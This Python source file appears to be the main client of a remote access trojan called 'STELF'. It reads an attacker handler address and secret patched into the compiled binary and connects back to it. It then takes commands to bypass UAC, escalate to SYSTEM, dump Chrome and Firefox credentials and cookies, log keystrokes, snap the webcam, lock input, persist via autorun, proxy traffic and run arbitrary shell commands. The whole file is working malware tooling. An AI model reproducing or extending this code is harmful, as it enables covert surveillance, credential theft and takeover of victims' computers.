import getpass

from core.misc import misc
from core.execute import execute
from core.filesystem import fs
from core.privesc import privesc
from core.information import info
from core.networking import net
from core.common import *

from core.communication import Transport

import sys
import logging
import time

if sys.stdout.isatty():
	logging.basicConfig(level=logging.DEBUG, format="%(asctime)s %(levelname)s in %(funcName)s: %(message)s")
else:
	logging.basicConfig(level=logging.CRITICAL, format="%(asctime)s %(levelname)s in %(funcName)s: %(message)s")

try:
	print sys.frozen
	logging.debug("Looks like we're compiled. Let's read encoded data...")
	with open(sys.argv[0], "rb") as f:
		f.seek(972)
		HANDLER_IP = ""
		for i in range(4):
			HANDLER_IP += str(ord(f.read(1)))+"."
		port1 = ord(f.read(1))
		port2 = ord(f.read(1))
		HANDLER_PORT = int(str(hex(port1)[2:].zfill(2))+str(hex(port2)[2:].zfill(2)), 16)
		HANDLER_IP = HANDLER_IP[:-1]
		
		f.seek(930)
		AUTH_SECRET = f.read(30)
except Exception as e:
	logging.debug("We're uncompyled, let's use these values...")
	HANDLER_IP = "127.0.0.1"
	HANDLER_PORT = 8080
	with open("stelf.guid", "rb") as f:
		AUTH_SECRET = f.read()
		
logging.debug("Handler is at "+str(HANDLER_IP)+":"+str(HANDLER_PORT)+", auth key is "+AUTH_SECRET)
	
def status(stat):
	shell.transport.user_channel.signal("STATUS:"+stat)
		
class Job:
	def __init__(self, func, args, com):
		self.func = func
		self.args = args
		self.command = com
		
		self.output = "[-]Command still running."
		self.finished = False
		
		self.thread = StoppableThread(target=self.run)
		self.thread.daemon = True
		self.thread.start()
		
	def run(self):
		self.output = self.func(self.args)
		self.finished = True
		
	def __repr__(self):
		return self.command+", Finished: "+str(self.finished)
		
	def __str__(self):
		return self.__repr__()
	
class Shell:
	"""
	The shell class receives commands input by the user and acts accordingly.
	"""
	def __init__(self, transport):
		self.transport = transport
		self.channel = self.transport.user_channel
		self.jobs = []
		
	def help(self):
		return '''Commands:
jobs [start|add|list|print|stop|rm] [number] - Add and remove commands running in background.
isadmin - Returns whether the current process has admin privileges.
bypassuac - Bypasses UAC.
dumpchrome - Dumps Chrome credentials.
dumpff - Dumps Firefox credientials.
die - Quit the shell.
getsystem - Get the system and escalate privs!
download [file] - Download a file to attacker machine.
upload [file] - Upload file to victim machine.
portscan [hosts] [ports] - Perform a port scan on given hosts.
proxy start - Start SOCKSv4 proxy on victim.
persist - Add STELF to autorun.
keylog|keyscan [start|stop|dump] - Start or stop the keylogger, or print logged keys.
webcam [list|snap] [id] - Take a picture from the webcam
uictl [disable|enable] [mouse|keyboard] - Lock or unlock mouse and keyboard.
help - This menu!
'''
		
	def pong(self):
		return "PONG"
		
	def error(self, err):
		return err
		
	def parse_command(self, data):
		if data == "CONN_LOST":
			return False, False
			
		elif data == "PING":
			return self.pong, 
			
		elif data == "help" or data == "?":
			return self.help, 
			
		elif data.startswith("cd"):
			data = data[3:]
			return fs.change_directory, data.strip()
			
		elif data == "ls":
			return execute.execute_shell_command, "dir"
			
		elif data == "ps":
			return execute.execute_shell_command, "tasklist"
			
		elif data.startswith("killall"):
			process = data.split()[1]
			return execute.execute_shell_command, "taskkill /F /IM "+process+" /T"
			
		elif data == "isadmin":
			return misc.isadmin, 
			
		elif data == "bypassuac":
			return privesc.bypass_uac,
			
		elif data == "dumpchrome":
			return info.dump_chrome,
			
		elif data == "dumpff":
			return info.dump_firefox,
			
		elif data == "die":
			os._exit(0)
			
		elif data == "getsystem":
			return privesc.get_system,
			
		elif data.startswith("download"):
			file = data.split()[1]
			return fs.download, file, self.channel
			
		elif data.startswith("upload"):
			file = data.split()[1]
			return fs.upload, file, self.channel
			
		elif data == "persist":
			return misc.persist, 
			
		elif data.startswith("portscan"):
			try:
				hosts, ports = data.split()[1], data.split()[2]
				return net.portscan, hosts, ports
			except Exception as e:
				return self.error, str(e)+"\nusage: portscan [host_range] [port_range]"
				
		elif data.startswith("keylog") or data.startswith("keyscan"):
			try:
				arg = data.split()[1]
			except:
				return self.error, "[*] Usage: keylog [start|stop|dump]"
				arg = ""
			if arg == "start":
				return info.keylog_start,
			elif arg == "stop":
				return info.keylog_stop, 
			elif arg == "dump":
				return info.keylog_dump,
				
		elif data.startswith("webcam"):
			try:
				arg = data.split()[1]
			except:
				return self.error, "[*] Usage: webcam [list|snap [id] ]"
				arg = ""
			
			if arg == "list":
				return info.webcam_list, 
			elif arg == "snap":
				try: num = data.split()[2]
				except: return err, "[*] Usage: webcam [list|snap [id] ]"
				return info.webcam_snap, num
				
		elif data.startswith("uictl"):
			try:
				action, what = data.split()[1], data.split()[2]
			except:
				return self.error, "[*]Usage: uictl [disable|enable] [mouse|keyboard]"
			else:
				return info.uictl, action+" "+what
				
		elif data == "screenshot":
			return info.take_screenshot
			
		elif data == "dumpcookies" or data == "cookiemonster" or data == "OM NOM NOM":
			return info.dump_cookies

		else:
			return execute.execute_shell_command, data
		
	def run(self):
		if not self.transport.connect(): return False
		
		while True:
			data = self.recv()
			
			if data.startswith("jobs"):
				data = data.split()
				if len(data) < 2:
					output = "[*]Usage: jobs [start|add|list|print|stop|rm] [number]"
				
				elif data[1] == "start" or data[1] == "add":
					if len(data) < 3: output = "[-]What do you want me to run?"
					else:
						command = " ".join(data[2:])
						parsed = self.parse_command(command)
						func, args = parsed[0], " ".join(parsed[1:])
						
						job = Job(func, args, command)
						self.jobs.append(job)
						output = "[+]Job started."
					
				elif data[1] == "list":
					output = "[*]Current active jobs:\n"
					for i, job in enumerate(self.jobs):
						output += "["+str(i)+"]: "+str(job)+"\n"
						
				elif data[1] == "print":
					if len(data) < 3: output = "[-]Which job?"
					else:
						try:
							which = int(data[2])
							output = self.jobs[which].output
						except:
							output = "[-]"+str(which)+" is not a valid job ID."
					
				elif data[1] == "stop" or data[1] == "rm":
					if len(data) < 3: output = "[-]Which job?"
					else:
						try:
							which = int(data[2])
							del self.jobs[which]
							output = "[+]Job removed."
						except:
							output = "[-]"+str(which)+" is not a valid job ID."
					
				else:
					output = "[-]No such option: "+data[1]
				
			else:
				parsed = self.parse_command(data)
				func, args = parsed[0], parsed[1:]
				if not func: return False
				output = func(*args)
				
			if output != "BG_NEW_SESH": self.send(str(output)+"\n"+os.getcwd()+">>")
		
	def send(self, data):
		self.channel.write_output(data)
		
	def recv(self):
		return self.channel.read_input()
		
while True:
	shell = Shell(Transport(HANDLER_IP,HANDLER_PORT, AUTH_SECRET))
	
	misc.shell = shell
	execute.shell = shell
	info.shell = shell # There's probably a cleaner way of doing this
	net.shell = shell
	fs.shell = shell
	privesc.shell = shell
	
	if not shell.run():
		del shell
		for t in threading.enumerate():
			try: t.stop() # RED LIGHT
			except: pass
		time.sleep(5)
	
